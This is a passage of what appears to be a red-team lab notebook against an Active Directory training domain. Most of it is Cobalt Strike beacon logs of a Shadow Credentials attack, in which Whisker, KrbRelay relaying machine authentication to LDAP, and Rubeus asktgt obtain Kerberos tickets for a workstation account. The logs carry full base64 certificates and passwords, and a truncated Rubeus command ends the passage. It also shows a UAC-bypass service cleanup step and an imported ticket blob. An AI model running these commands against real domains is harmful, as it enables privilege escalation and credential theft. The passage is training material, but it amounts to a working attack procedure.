      kJ+gCTgkAWZuknFVjgpONJx4DXgUqLyDBMnIXyOt1aYbFvmAHl+/J/zMetA7XQXHNCTsg6LUupW4WYN5
      ZHz+14izu3yyRB9DdeYxV8volNRNAyPxPSCcVDp/3Wv+lnabU03cg8n4vbozxxc7wwwlgL9w+3Kzd6vB
      9MmnfNg6Mf84djt+M2ppuSEBO1EqMQ6V2sl7cDdadCOG8e5Vqicr0fpcpeo5JNdlk+cu8jRTa+MB5oFZ
      BuXyE5gqheWjGqCqaa/uDznLPUHwe7sdneMgPQwDumZqg80zMv5dHRkY3W6xyAQngSv2oJCnM+Q9gKFu
      vIojInXxwhU/D/GHmQBiA3oHtH2Kvmve8+2vvdyj8GiUcRMyVyRKTRdyiDx2pTmZTqxeJfNhZdsy5ayx
      YNgozDq6xbg/86fT5XVFND2tgcy1FaylS1CxNYzaAncEWbgCpyOR0+VzdYq+YvN1zkDfZeL2FpclJSAR
      ub2CuMIv/5ZcG1nzR6dNa8xkrypuBc7Qa+nDf3enA7Wbq3XPyGRbq2M0omsX0X2d2JZE5ah5ewWEYCHr
      chiSkgN0gpSy0ZDGyuGQvDpDmLEAtwQfWLnZLxRl6dHKdT2vcl7iObMcEAdvTXvRC0ntzmRgjZUKJiiU
      oxcalsRrr/BXbGuLdo7EMv58dBxR0a1KnQoNqv9QT4W3an+xukJsvIYS2hwUc+ixacSKBzNovAAG9EXr
      jlkq1eoVp2ZCbOyIdJA5jC4VdYalpUW89rOtTNIi05v4HbvA/oLYsJrYZoXKuHKSK8ibd5NPfOljgkGx
      +P521udLm2cCnp2OakqjZGc/UpVcCqz+Dn8kRUTT0MCk36EYfXJl33onUy5fBTBdmNc3QIWb9uR/vML8
      9h0tEEQQe7bMJB9sqXmtalklBoOPTWJCSYIxB4FWRWwqAo3qDP3bQ8VZMmte1v3baRJZTbSechsho4He
      MIHboAMCAQCigdMEgdB9gc0wgcqggccwgcQwgcGgGzAZoAMCARGhEgQQp+lRyXDQKl9f1vuMjWNKcKET
      GxFERVYuQ1lCRVJCT1RJQy5JT6IaMBigAwIBCqERMA8bDUFkbWluaXN0cmF0b3KjBwMFAEChAAClERgP
      MjAyMzEyMTExODM4MTdaphEYDzIwMjMxMjEyMDQzNDMwWqcRGA8yMDIzMTIxODE4MzQzMFqoExsRREVW
      LkNZQkVSQk9USUMuSU+pGjAYoAMCAQKhETAPGwRob3N0Gwd3a3N0bi0y
[+] Ticket successfully imported!

```

`run sc delete UACBypassedService`

# Shadow Credentials
list entries
```powershell
[12/11 19:05:20] beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:wkstn-2$
[12/11 19:05:21] [*] Tasked beacon to run .NET program: Whisker.exe list /target:wkstn-2$
[12/11 19:05:21] [+] host called home, sent: 151346 bytes
[12/11 19:05:22] [+] received output:
[*] Searching for the target account
[*] Target user found: CN=WKSTN-2,OU=Workstations,DC=dev,DC=cyberbotic,DC=io
[*] Listing deviced for wkstn-2$:
[*] No entries!

```
if get error `System.Runtime.InteropServices.COMException (0x800706D3): The authentication service is unknown.` need to restart the machine
```powershell
[12/11 19:05:35] beacon> execute-assembly C:\Tools\KrbRelay\KrbRelay\bin\Release\KrbRelay.exe -spn ldap/dc-2.dev.cyberbotic.io -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -shadowcred -port 10
[12/11 19:05:53] [*] Tasked beacon to run .NET program: KrbRelay.exe -spn ldap/dc-2.dev.cyberbotic.io -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -shadowcred -port 10
[12/11 19:05:54] [+] host called home, sent: 1728446 bytes
[12/11 19:05:55] [+] received output:
[*] Relaying context: dev.cyberbotic.io\WKSTN-2$
[*] Rewriting function table
[*] Rewriting PEB
[*] GetModuleFileName: System
[*] Init com server
[*] GetModuleFileName: C:\Windows\system32\gpupdate.exe
[*] Register com server
objref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGgQIAAAAAAABHEqv3fRdFnLOlRTu5VqvMAiAAADQx//+Xwk/DW1QGSyIADAAHADEAMgA3AC4AMAAuADAALgAxAAAAAAAJAP//AAAeAP//AAAQAP//AAAKAP//AAAWAP//AAAfAP//AAAOAP//AAAAAA==:

[*] Forcing SYSTEM authentication
[*] Using CLSID: 90f18417-f0f1-484e-9d3c-59dceee5dbd8
System.Runtime.InteropServices.COMException (0x800706D3): The authentication service is unknown.

The authentication service is unknown.

   at KrbRelay.Ole32.CoGetInstanceFromIStorage(COSERVERINFO pServerInfo, Guid& pclsid, Object pUnkOuter, CLSCTX dwClsCtx, IStorage pstg, UInt32 cmq, MULTI_QI[] rgmqResults)
   at KrbRelay.Program.Main(String[] args)

```
after restart
```powershell
[12/11 19:18:46] beacon> execute-assembly C:\Tools\KrbRelay\KrbRelay\bin\Release\KrbRelay.exe -spn ldap/dc-2.dev.cyberbotic.io -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -shadowcred -port 10
[12/11 19:19:04] [*] Tasked beacon to run .NET program: KrbRelay.exe -spn ldap/dc-2.dev.cyberbotic.io -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -shadowcred -port 10
[12/11 19:19:04] [+] host called home, sent: 1728446 bytes
[12/11 19:19:05] [+] received output:
[*] Relaying context: dev.cyberbotic.io\WKSTN-2$
[*] Rewriting function table
[*] Rewriting PEB
[*] GetModuleFileName: System
[*] Init com server
[*] GetModuleFileName: C:\Windows\system32\gpupdate.exe
[*] Register com server
objref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGgQIAAAAAAADNxMaoGlknnPYG8Kg3VCH3AkgAANwJ//+rjFjgDfD1wiIADAAHADEAMgA3AC4AMAAuADAALgAxAAAAAAAJAP//AAAeAP//AAAQAP//AAAKAP//AAAWAP//AAAfAP//AAAOAP//AAAAAA==:

[*] Forcing SYSTEM authentication
[*] Using CLSID: 90f18417-f0f1-484e-9d3c-59dceee5dbd8

[12/11 19:19:05] [+] received output:
[*] apReq: 608206e306092a864886f71201020201006e8206d2308206cea003020105a10302010ea20703050020000000a38204ef618204eb308204e7a003020105a1131b114445562e4359424552424f5449432e494fa2293027a003020102a120301e1b044c4441501b1664632d322e6465762e6379626572626f7469632e696fa382049e3082049aa003020112a103020104a282048c04820488342bbd2df5834820d1a54c24464b9b30a7c134920bff72cb0426b491de60cb7672d17f4f997920bf7569eb929ca427e8e511967bcbd0d6c3fafc7d2838b782c2a1586c24aa14161b14730ce04bdf39c0d3f42d0268640477d45b8440ece7004ece1b695703273467c0dc0532c68a62ad254251b78a80142470d7751dba9948032f7443819d4782a77c88a1393de1947d100fc15234971eb8ea52e75c32ed717a5e89aed313f16f033bd952ce317453b9826cafcfb3e4b97ab09ba065de32f96c68b9b86e1dc95c2eb49dcf405eb9916e4c5c72661ca2888c91894a0c22cda6ec56e260d907293b476aa67e61cf7a3629932d9bea83184fc439f1fbe3f7ef0207a76dd3cf93b65de5138023e428d1c5c48eeda35c7f9c44e7803a3048c272aaf7107d227580d946b74e8563dbbdbbceb7e7957e333f9d79c6005abb6847ae1ae4653fafbfe894f8d545a7bff7be0d0614706980572fefef1d30328733ec9392d7c6ba4e735ce98e12addb7dc6e5fb0a1302c6c96d03b941967ef14527d5109c09d1a7af53eba00564ad4bb94410e198afb409531bb16536e84cb561dad3cbe512818ba688ccc48268425cb72bd3f97325a87f25cfc315561827b46336e3aa64eb3f0831a7391bf843351ef7ab30a8431cc86181d6ae9301fa64c5f8be12a3cc4380238d5bfdc77f952ba441cb30ef5bc495350771a1190ec8fcbb59ca4fb21cd02b9c5f18ff761df91ddc610e7d804d2694c59cef644b724b162c41df0763dfdfc8792be3d9414a72e8aef39e3c21165e08cddf36474e9971e4d115abc80b8217512c751cbb5a6e21da93234f5ea16448c624593198e9e5de457da1b27c0e97b914e29978a9a9b1657e04db7a1c4a07460d55ab935265f33f085c35a2217acbcd1d2eaf12c04ced9363777bab4c8159fcc6431ed248320beeb86bec3915fd1945cc728d173c92c3a2be54d32de3f839634c6d2fcad082f0c23f024bb47b22613192a3f636f023c1068e662ffea7d934b9dd1fd73a7573ae1cf40981f680599dd2fa817ba383433ce81f6aec34dcc1d0c842366ad4f8ebc206590a234a72c67a67a3dfb2d09fb17a9cc69d65d8dd3b10404df938b553aa2d264c23d3ee05afb0d47c320793863fc65759293a160515b3ee81525af0e0beba5def95be8bafbb2a73fc1e86af36af1e4a44eadadc4a9c95c7099cd2f09e7607ff1e4aeefe7ac61334aa26285a6aed47c5f5ba3dff169b778379f7d8103c527bff3289d406a543b561641a19dd56a85ad237fe5bc00a3f93eba595d3670a8d716c263a90d05d72d4aad4a15bcc446c2424ad1431546f187654945a110890b3458f0dcc12e4d3d2cd6818c265ecbe176457a5028f77a184c58769ea9303b4d9cbe07d5a244377c37c90be3f3c18880af18febd7e5d2ab0eb3d866412bdd94e0947a0e392be873bf38f90a8e29fe0185eb9b1925cdc533fbd5123a63a679125edf1b0337f74f44ade3f207cfe80bb15913b85e02dd13f7c15b2aa4cc4247e6c7e8fcbc7686fa6671410f02a9a2c831b0a3d86d5cd2ad81d9fa1cfb70574f115be509292ba6c84a2487b5418f0db6e4a46529fd7b7636bd9e0fd575d8121d4f342806afccf62ba069d284b71a365d5330a0bba48201c4308201c0a003020112a28201b7048201b38c3d4ded17e1d0895442f55d9b52db9892fbe7a1461e3d62d67b76310764e34131788279528f47ef5b6f5d1f77d559eef27c9645234fda284a31a0746d5376baef68c39ada84b224136901ff9e2009442ce9ec370d333d60eb752cecdbae37ead52857df5e67c37920abb6eb01d1ce8e70a330ebb802080bd082d8c7ac89fc895a2137834eb648ab3c5535e8bf01f3ff9c0e00d43df802e19dcc5eb5fda078eb39ca917a658f4fa5d47d7bdf803252416c3af927688c4c50dcc338cc0cd6afe11bd09ea8377c2b7d962b94f3ad55ba4ecb2d043d29b79f87317714bd623b951851a57112678eb01f39afb20542d32b022b9fd32bdd6fa086db6b5b264fd8b19e18cc586e1034c273cb2037bd8a0416abcf51addcb93000a91946c10bf535982c3a96e2c0935843177d922f3aeef075b9bf61dddf96409f1342807db45443c65839a13ba05fa074660a539dc5cfb2a41d0252e223b3d55786415ed42066fb12568ac8aa1710710735e7ed24a44e663d64b8ebaaa5b7c6d627cc0028757d835491e40ca08f370c0490c6b7117bf9cb08670c6803b187b3838da55aae6d2676370c8fb6e4fa5870ed92fff142e3fb7bed78edb359
[*] bind: 0
[*] ldap_get_option: LDAP_SASL_BIND_IN_PROGRESS
[*] apRep1: 6f8187308184a003020105a10302010fa2783076a003020112a26f046d4442cf69d5e45bbd72dbe38452b17967c5a3cc78d790c79fb1cef1f06530127675ebf527365452d1f575eb3398a071653e578caf32e3ad2b3d5a849a6f6e84a3a73fe6b4ad5c71f290d7a538ee406bd94a269a828740ca1574a036793738a62c7b2f0b39d15279c625f1fbbbba
[*] AcceptSecurityContext: SEC_I_CONTINUE_NEEDED
[*] fContextReq: Delegate, MutualAuth, UseDceStyle, Connection
[*] apRep2: 6f5b3059a003020105a10302010fa24d304ba003020112a2440442c5f37934dd7a6709418a958116701994e9ca72c34bbfbc3f8fc1a2a873dc714d674e5c44479f9cc39225f7507631ab664e908acb0969224cffb05e6f878264e1fc75
[*] bind: 0
[*] ldap_get_option: LDAP_SUCCESS
[+] LDAP session established

[12/11 19:19:05] [+] received output:
[*] ldap_modify: LDAP_SUCCESS
Rubeus.exe asktgt /user:WKSTN-2$ /certificate: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 /password:"b2986025-cc0c-4cdc-a47c-ca0d860dd69e" /getcredentials /show
```

`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktg`
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:WKSTN-2$ /certificate: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 /password:"b2986025-cc0c-4cdc-a47c-ca0d860dd69e" /enctype:aes256 /nowrap



execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:WKSTN-2$ /certificate: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